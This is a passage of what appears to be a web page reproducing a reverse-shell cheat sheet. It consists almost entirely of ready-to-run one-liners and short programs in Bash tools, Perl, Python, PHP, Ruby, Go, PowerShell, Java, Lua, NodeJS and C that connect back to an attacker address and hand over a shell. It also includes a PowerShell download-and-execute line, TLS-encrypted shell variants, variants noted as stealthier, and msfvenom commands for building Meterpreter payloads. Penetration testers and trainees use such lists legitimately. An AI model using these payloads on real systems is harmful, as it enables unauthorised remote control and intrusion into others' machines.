<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span></span><br></pre></td></tr></table></figure>

<p>Static socat binary can be found at <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Windows only</span><br><span class="line">perl -MIO -e <span class="string">'$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Linux only</p>
<p>IPv4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">export RHOST=<span class="string">"10.0.0.1"</span>;export RPORT=<span class="number">4242</span>;python -c <span class="string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span></span><br></pre></td></tr></table></figure>

<p>IPv4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>

<p>IPv6</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>

<p>Windows only</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Python27\python.exe -c <span class="string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), &#123;'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type('try', (), &#123;'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(&#123;&#125;), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(&#123;&#125;), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3", "r");'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'</span></span><br></pre></td></tr></table></figure>

<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">NOTE:</span> Windows only</span><br><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure>

<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'package main;import"os/exec";import"net";func main()&#123;c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;'</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</span><br></pre></td></tr></table></figure>

<h3 id="Netcat-Traditional"><a href="#Netcat-Traditional" class="headerlink" title="Netcat Traditional"></a>Netcat Traditional</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 4242</span><br><span class="line">nc -e /bin/bash 10.0.0.1 4242</span><br><span class="line">nc -c bash 10.0.0.1 4242</span><br></pre></td></tr></table></figure>

<h3 id="Netcat-OpenBsd"><a href="#Netcat-OpenBsd" class="headerlink" title="Netcat OpenBsd"></a>Netcat OpenBsd</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<h3 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat 10.0.0.1 4242 -e /bin/bash</span><br><span class="line">ncat --udp 10.0.0.1 4242 -e /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p>Attacker:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@attack$ openssl req -x509 -newkey rsa:<span class="number">4096</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line">user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="number">4242</span></span><br><span class="line">or</span><br><span class="line">user@attack$ ncat --ssl -vv -l -p <span class="number">4242</span></span><br><span class="line"></span><br><span class="line">user@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span> &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>

<p>TLS-PSK (does not rely on PKI or self-signed certificates)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate 384-bit PSK</span></span><br><span class="line"><span class="comment"># use the generated string as a value for the two PSK variables from below</span></span><br><span class="line">openssl rand -hex 48 </span><br><span class="line"><span class="comment"># server (attacker)</span></span><br><span class="line"><span class="built_in">export</span> LHOST=<span class="string">"*"</span>; <span class="built_in">export</span> LPORT=<span class="string">"4242"</span>; <span class="built_in">export</span> PSK=<span class="string">"replacewithgeneratedpskfromabove"</span>; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk <span class="variable">$PSK</span> -nocert -accept <span class="variable">$LHOST</span>:<span class="variable">$LPORT</span></span><br><span class="line"><span class="comment"># client (victim)</span></span><br><span class="line"><span class="built_in">export</span> RHOST=<span class="string">"10.0.0.1"</span>; <span class="built_in">export</span> RPORT=<span class="string">"4242"</span>; <span class="built_in">export</span> PSK=<span class="string">"replacewithgeneratedpskfromabove"</span>; <span class="built_in">export</span> PIPE=<span class="string">"/tmp/`openssl rand -hex 4`"</span>; mkfifo <span class="variable">$PIPE</span>; /bin/sh -i &lt; <span class="variable">$PIPE</span> 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk <span class="variable">$PSK</span> -connect <span class="variable">$RHOST</span>:<span class="variable">$RPORT</span> &gt; <span class="variable">$PIPE</span>; rm <span class="variable">$PIPE</span></span><br></pre></td></tr></table></figure>

<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">"10.0.0.1"</span>,<span class="number">4242</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="nomarkup">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (pwd).Path + <span class="string">"&gt; "</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()"</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;s = "/inet/tcp/0/10.0.0.1/4242"; while(42) &#123; do&#123; printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != "exit") close(s); &#125;&#125;'</span> /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h4 id="Java-Alternative-1"><a href="#Java-Alternative-1" class="headerlink" title="Java Alternative 1"></a>Java Alternative 1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4444</span>;</span><br><span class="line">String cmd=<span class="string">"cmd.exe"</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<h4 id="Java-Alternative-2"><a href="#Java-Alternative-2" class="headerlink" title="Java Alternative 2"></a>Java Alternative 2</h4><p><strong>NOTE</strong>: This is more stealthy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread = <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// Reverse shell here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure>

<h3 id="War"><a href="#War" class="headerlink" title="War"></a>War</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> LPORT=<span class="number">4242</span> -f war &gt; reverse.war</span><br><span class="line">strings reverse.war | grep jsp # in order to get the name of the file</span><br></pre></td></tr></table></figure>


<h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><p>Linux only</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>

<p>Windows and Linux</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lua5.<span class="number">1</span> -e <span class="string">'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span></span><br></pre></td></tr></table></figure>

<h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">"child_process"</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">"/bin/sh"</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">4242</span>, <span class="string">"10.0.0.1"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application form crashing</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'nc -e /bin/sh 10.0.0.1 4242'</span>)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">-<span class="keyword">var</span> x = global.process.mainModule.require</span><br><span class="line">-x(<span class="string">'child_process'</span>).exec(<span class="string">'nc 10.0.0.1 4242 -e /bin/bash'</span>)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span></span><br></pre></td></tr></table></figure>

<h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>by <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" target="_blank" rel="noopener">frohoff</a><br>NOTE: Java reverse shell also work for Groovy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">"10.0.0.1"</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4242</span>;</span><br><span class="line">String cmd=<span class="string">"cmd.exe"</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<h4 id="Groovy-Alternative-1"><a href="#Groovy-Alternative-1" class="headerlink" title="Groovy Alternative 1"></a>Groovy Alternative 1</h4><p><strong>NOTE</strong>: This is more stealthy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.start &#123;</span><br><span class="line">    <span class="comment">// Reverse shell here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;arpa/inet.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">4242</span>;</span><br><span class="line">    <span class="keyword">struct</span> sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">"10.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> * <span class="keyword">const</span> argv[] = &#123;<span class="string">"/bin/sh"</span>, NULL&#125;;</span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>, argv, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h2><h3 id="Windows-Staged-reverse-TCP"><a href="#Windows-Staged-reverse-TCP" class="headerlink" title="Windows Staged reverse TCP"></a>Windows Staged reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure>

<h3 id="Windows-Stageless-reverse-TCP"><a href="#Windows-Stageless-reverse-TCP" class="headerlink" title="Windows Stageless reverse TCP"></a>Windows Stageless reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure>

<h3 id="Linux-Staged-reverse-TCP"><a href="#Linux-Staged-reverse-TCP" class="headerlink" title="Linux Staged reverse TCP"></a>Linux Staged reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> -f elf &gt;reverse.elf</span><br></pre></td></tr></table></figure>

<h3 id="Linux-Stageless-reverse-TCP"><a href="#Linux-Stageless-reverse-TCP" class="headerlink" title="Linux Stageless reverse TCP"></a>Linux Stageless reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> -f elf &gt;reverse.elf</span><br></pre></td></tr></table></figure>

<h3 id="Other-platforms"><a href="#Other-platforms" class="headerlink" title="Other platforms"></a>Other platforms</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f elf &gt; shell.elf</span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f exe &gt; shell.exe</span><br><span class="line">$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f macho &gt; shell.macho</span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f asp &gt; shell.asp</span><br><span class="line">$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f raw &gt; shell.jsp</span><br><span class="line">$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f war &gt; shell.war</span><br><span class="line">$ msfvenom -p cmd/unix/reverse_python LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f raw &gt; shell.py</span><br><span class="line">$ msfvenom -p cmd/unix/reverse_bash LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f raw &gt; shell.sh</span><br><span class="line">$ msfvenom -p cmd/unix/reverse_perl LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f raw &gt; shell.pl</span><br><span class="line">$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="string">"10.0.0.1"</span> LPORT=<span class="number">4242</span> -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h2 id="Spawn-TTY-Shell"><a href="#Spawn-TTY-Shell" class="headerlink" title="Spawn TTY Shell"></a>Spawn TTY Shell</h2><p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4242</span></span><br><span class="line"></span><br><span class="line">rlwrap -r -f . nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4242</span></span><br><span class="line">-f . will make rlwrap use the current history file as a completion word list.</span><br><span class="line">-r Put all words seen on in- and output on the completion list.</span><br></pre></td></tr></table></figure>

<p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p>
